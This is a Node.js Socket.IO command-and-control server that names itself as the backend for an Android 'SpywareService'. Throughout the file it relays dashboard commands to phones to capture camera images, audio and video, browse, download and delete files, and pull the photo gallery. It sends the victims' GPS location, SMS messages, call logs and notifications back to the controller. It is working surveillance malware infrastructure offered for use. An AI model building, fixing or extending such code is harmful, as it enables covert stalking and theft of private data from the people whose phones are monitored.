// node-backend/server.js — Complete Fixed Version
// Handles ALL signaling events for both StreamingService.java (Java) and SpywareService.kt (Kotlin)
const express = require('express');
const http    = require('http');
const { Server } = require('socket.io');
const cors    = require('cors');

const app    = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 50e6,   // 50 MB — needed for media/file/gallery chunks
  pingTimeout:  60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
  res.json({ status: 'WebRTC Signaling Server Running', time: new Date().toISOString() });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', devices: Object.keys(deviceSockets).length });
});

// ─────────────────────────────────────────────────────────────────────────────
// State maps
// ─────────────────────────────────────────────────────────────────────────────
const deviceSockets = {};  // deviceId  -> socket.id
const rooms         = {};  // socket.id -> { type, deviceId }
const webClients    = {};  // socket.id -> socket.id  (web controllers)

// ─────────────────────────────────────────────────────────────────────────────
// Routing helpers
// device→dashboard results always carry data.to = webClientId (dashboard socket.id)
// Use io.to(data.to) as the primary route; fall back to ctrl_ room for Kotlin path.
// ─────────────────────────────────────────────────────────────────────────────
const routeToWeb = (io, eventName, data) => {
  if (data?.to)             io.to(data.to).emit(eventName, data);              // Java path
  else if (data?.deviceId)  io.to(`ctrl_${data.deviceId}`).emit(eventName, data); // Kotlin path
};

io.on('connection', (socket) => {
  console.log('[+] Connect:', socket.id);

  // ── Identity ───────────────────────────────────────────────────────────────

  // Java StreamingService.java emits identify('android') on connect
  socket.on('identify', (type) => {
    if (type === 'android') {
      rooms[socket.id] = { type: 'device' };
      console.log('[identify] android:', socket.id);
    } else if (type === 'web') {
      rooms[socket.id] = { type: 'web' };
      webClients[socket.id] = socket.id;
      console.log('[identify] web:', socket.id);
    }
  });

  // Java path — device registers with its stable persisted deviceId
  socket.on('register-device', (data) => {
    const deviceId = data?.deviceId || socket.id;
    deviceSockets[deviceId] = socket.id;
    rooms[socket.id] = { type: 'device', deviceId };
    socket.join(`device_${deviceId}`);
    console.log('[register-device]', deviceId);
    // Notify ALL web clients the device list changed
    io.emit('device-list-update', Object.keys(deviceSockets));
  });

  // Dashboard requests current online device list
  socket.on('device-list', () => {
    socket.emit('device-list-update', Object.keys(deviceSockets));
  });

  // Dashboard connects to a specific device — Java path
  socket.on('web-client-ready', (data) => {
    const deviceId = data?.deviceId;
    rooms[socket.id] = { type: 'web', deviceId };
    webClients[socket.id] = socket.id;
    socket.join(`ctrl_${deviceId}`);
    // Tell the device which socket.id to use as data.to in all its responses
    io.to(`device_${deviceId}`).emit('web-client-ready', { webClientId: socket.id });
    console.log('[web-client-ready] device:', deviceId, 'web:', socket.id);
  });

  // Dashboard connects to a specific device — Kotlin path
  socket.on('join-as-controller', (data) => {
    const deviceId = data?.deviceId;
    rooms[socket.id] = { type: 'web', deviceId };
    webClients[socket.id] = socket.id;
    socket.join(`ctrl_${deviceId}`);
    io.to(`device_${deviceId}`).emit('start-stream',     { controllerId: socket.id });
    io.to(`device_${deviceId}`).emit('web-client-ready', { webClientId:  socket.id });
    console.log('[join-as-controller] device:', deviceId);
  });

  // ── WebRTC Signaling ────────────────────────────────────────────────────────

  // Java path — full envelope with data.to
  socket.on('signal', (data) => {
    if (data?.to) io.to(data.to).emit('signal', { ...data, from: socket.id });
  });

  // Kotlin path — individual events
  socket.on('offer',         d => { if (d?.to) io.to(d.to).emit('offer',         { ...d, from: socket.id }); });
  socket.on('answer',        d => { if (d?.to) io.to(d.to).emit('answer',        { ...d, from: socket.id }); });
  socket.on('ice-candidate', d => { if (d?.to) io.to(d.to).emit('ice-candidate', { ...d, from: socket.id }); });

  // ── Device Control Commands (Dashboard → Device) ───────────────────────────

  socket.on('capture-image', d => {
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('capture-image', { camera: d.camera || 'front' });
  });
  socket.on('capture-audio', d => {
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('capture-audio', { duration: d.duration || 10 });
  });
  socket.on('capture-video', d => {
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('capture-video', { duration: d.duration || 15, camera: d.camera || 'back' });
  });
  socket.on('torch', d => {
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('torch', { on: d.on });
  });

  // FIX: these three were completely missing from the old server
  socket.on('switch-camera', d => {
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('switch_camera', d);  // Java listens as switch_camera
  });
  socket.on('switch_camera', d => {   // alias — dashboard may emit either spelling
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('switch_camera', d);
  });
  socket.on('switch-audio', d => {
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('switch-audio', d);
  });
  socket.on('sync-data', d => {
    if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('sync-data', d);
  });

  // ── Device → Dashboard Data (FIX: route by data.to = webClientId) ──────────

  // GPS location
  // FIX: old code used io.emit() (broadcast to ALL). Now routes only to the
  // watching dashboard via data.to (Java) or ctrl_ room (Kotlin fallback).
  socket.on('location', d => {
    if (d?.to)            io.to(d.to).emit('location-update', d);
    else if (d?.deviceId) io.to(`ctrl_${d.deviceId}`).emit('location-update', d);
  });

  // SMS
  // FIX: old code used ctrl_ room — Java never joins it. Now routes by data.to.
  socket.on('sms', d => {
    routeToWeb(io, 'sms', d);
  });
  socket.on('sms-messages', d => {   // alias used in some Java builds
    routeToWeb(io, 'sms-messages', d);
  });

  // Call logs
  socket.on('call_log', d => {
    routeToWeb(io, 'call_log', d);
  });
  socket.on('call-logs', d => {   // alias
    routeToWeb(io, 'call-logs', d);
  });

  // Notifications
  socket.on('notification', d => {
    routeToWeb(io, 'notification', d);
  });

  // Media capture result
  // FIX: old code used ctrl_ room which broke the Java path.
  socket.on('media-captured', d => {
    if (d?.to)            io.to(d.to).emit('media-ready', d);
    else if (d?.deviceId) io.to(`ctrl_${d.deviceId}`).emit('media-ready', d);
  });

  // ── File Explorer ──────────────────────────────────────────────────────────

  // Dashboard → Device commands
  socket.on('fs:list',    d => { if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('fs:list',    d); });
  socket.on('fs:download',d => { if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('fs:download',d); });
  socket.on('fs:delete',  d => { if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('fs:delete',  d); });

  // Device → Dashboard results
  // FIX: old code used ctrl_${data.deviceId} — broken for Java path.
  // Now routes by data.to (webClientId = dashboard socket.id).
  socket.on('fs:list_result',       d => { routeToWeb(io, 'fs:list_result',       d); });
  socket.on('fs:download_start',    d => { routeToWeb(io, 'fs:download_start',    d); });
  socket.on('fs:download_chunk',    d => { routeToWeb(io, 'fs:download_chunk',    d); });
  socket.on('fs:download_complete', d => { routeToWeb(io, 'fs:download_complete', d); });

  // ── Gallery (NEW — not in old server at all) ────────────────────────────────

  // Dashboard → Device
  socket.on('gallery:list',     d => { if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('gallery:list',     d); });
  socket.on('gallery:download', d => { if (d?.deviceId) io.to(`device_${d.deviceId}`).emit('gallery:download', d); });

  // Device → Dashboard
  socket.on('gallery:list_result',     d => { routeToWeb(io, 'gallery:list_result',     d); });
  socket.on('gallery:download_result', d => { routeToWeb(io, 'gallery:download_result', d); });

  // ── Disconnect ─────────────────────────────────────────────────────────────

  socket.on('disconnect', (reason) => {
    console.log('[-] Disconnect:', socket.id, reason);
    const info = rooms[socket.id];
    if (info?.type === 'device' && info?.deviceId) {
      delete deviceSockets[info.deviceId];
      io.emit('device-list-update', Object.keys(deviceSockets));
    }
    // Also scan deviceSockets in case identify ran before register-device
    for (const [deviceId, sid] of Object.entries(deviceSockets)) {
      if (sid === socket.id) {
        delete deviceSockets[deviceId];
        io.emit('device-list-update', Object.keys(deviceSockets));
        break;
      }
    }
    delete webClients[socket.id];
    delete rooms[socket.id];
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`✅ Signaling server on port ${PORT}`);
});
